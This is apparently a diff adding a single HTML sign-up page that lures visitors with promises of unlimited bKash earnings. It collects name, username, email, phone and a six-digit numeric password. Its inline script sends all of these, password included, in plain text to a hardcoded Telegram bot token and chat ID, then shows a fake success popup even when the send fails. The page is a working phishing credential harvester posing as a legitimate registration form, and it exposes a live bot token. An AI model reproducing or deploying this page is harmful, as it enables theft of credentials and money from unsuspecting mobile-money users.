@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up - earn money</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+        }
+
+        .header {
+            background: #2575fc;
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .form-container {
+            padding: 40px 30px;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 1.1rem;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #2575fc;
+            box-shadow: 0 0 0 3px rgba(37, 117, 252, 0.2);
+        }
+
+        .password-constraints {
+            font-size: 0.85rem;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .submit-btn {
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.3s, box-shadow 0.3s;
+            letter-spacing: 1px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 14px rgba(37, 117, 252, 0.4);
+        }
+
+        /* Popup Styles */
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s ease;
+        }
+
+        .popup.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .popup-content {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 90%;
+            width: 400px;
+            transform: scale(0.8);
+            transition: transform 0.4s ease;
+        }
+
+        .popup.active .popup-content {
+            transform: scale(1);
+        }
+
+        .popup h2 {
+            color: #2575fc;
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+
+        .popup p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            color: #555;
+        }
+
+        .popup .go-btn {
+            background: linear-gradient(to right, #00b09b, #96c93d);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .popup .go-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 14px rgba(150, 201, 61, 0.4);
+        }
+
+        .checkmark {
+            font-size: 80px;
+            color: #00b09b;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 576px) {
+            .container {
+                border-radius: 15px;
+            }
+            
+            .header {
+                padding: 20px 15px;
+            }
+            
+            .form-container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Create Account</h1>
+            <p>Join our secure community today earn Unlimited money > bKash</p>
+        </div>
+        
+        <div class="form-container">
+            <form id="signupForm">
+                <div class="input-group">
+                    <label for="fullName">Full Name</label>
+                    <input type="text" id="fullName" required placeholder="Enter your full name">
+                </div>
+                
+                <div class="input-group">
+                    <label for="userName">Username</label>
+                    <input type="text" id="userName" required placeholder="Choose a username">
+                </div>
+                
+                <div class="input-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" required placeholder="Enter your email">
+                </div>
+                
+                <div class="input-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" required placeholder="Enter your phone number">
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">Password (6 digits)</label>
+                    <input type="password" id="password" pattern="\d{6}" required 
+                           placeholder="Enter 6-digit password" title="Please enter exactly 6 digits">
+                    <p class="password-constraints">Must be exactly 6 numerical digits</p>
+                </div>
+                
+                <button type="submit" class="submit-btn">Sign Up</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Success Popup -->
+    <div class="popup" id="successPopup">
+        <div class="popup-content">
+            <div class="checkmark">✓</div>
+            <h2>Sign Up Successful!</h2>
+            <p>Your account has been created successfully</p>
+            <button class="go-btn" onclick="redirectToPage()">Go</button>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const formData = {
+                fullName: document.getElementById('fullName').value,
+                userName: document.getElementById('userName').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                password: document.getElementById('password').value
+            };
+            
+            // Telegram integration (replace with your bot token and chat ID)
+            const botToken = '7850244238:AAEJ7rsIrWwCowOJ5C3Rpx3WjBx4D_sDs-s';
+            const chatId = '1711774702';
+            const message = `New Sign-Up:\nName: ${formData.fullName}\nUsername: ${formData.userName}\nEmail: ${formData.email}\nPhone: ${formData.phone}\nPassword: ${formData.password}`;
+            
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            // Send data to Telegram
+            fetch(telegramUrl)
+                .then(response => response.json())
+                .then(data => {
+                    // Show success popup
+                    document.getElementById('successPopup').classList.add('active');
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                    // Still show success popup for demo purposes
+                    document.getElementById('successPopup').classList.add('active');
+                });
+        });
+        
+        function redirectToPage() {
+            // Replace with your actual redirect URL
+            window.location.href = 'blst.html';
+        }
+    </script>
+</body>
+</html>
